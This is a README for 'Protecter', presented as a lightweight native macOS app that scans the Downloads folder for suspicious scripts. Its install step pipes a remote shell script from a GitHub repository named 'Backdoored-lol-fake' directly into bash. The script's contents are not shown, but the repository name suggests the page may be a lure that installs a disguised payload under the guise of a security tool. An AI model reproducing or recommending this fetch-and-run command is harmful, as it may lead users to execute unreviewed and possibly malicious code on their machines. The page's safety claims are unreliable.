# Protecter — Lightweight Native macOS App

Protecter is a standalone native macOS application built with AppKit and Objective-C. It is packaged as `Protecter.app` with a custom `.icns` icon. It is not a web app, AppleScript wrapper, or background service.

## Install

```bash
curl -fsSL https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main/install.sh | bash
```

Requires macOS 14+ and Apple's Clang compiler. Install Apple's Command Line Tools with `xcode-select --install` if `clang` is unavailable. No Swift compiler, Homebrew, or ClamAV is required.

## What it does

- Small native AppKit interface
- Scans files in Downloads when you press Scan Downloads
- Checks common script files for combinations of suspicious command indicators
- Displays matching filenames, indicators, and file paths
- Does not delete, move, or modify files
- No LaunchAgent or background service

The installer compiles a small Objective-C app with Clang and caches the built app, so later reinstalls of the same version skip compilation. Protecter is a basic heuristic review tool, not a full antivirus. It may miss threats or flag legitimate scripts.
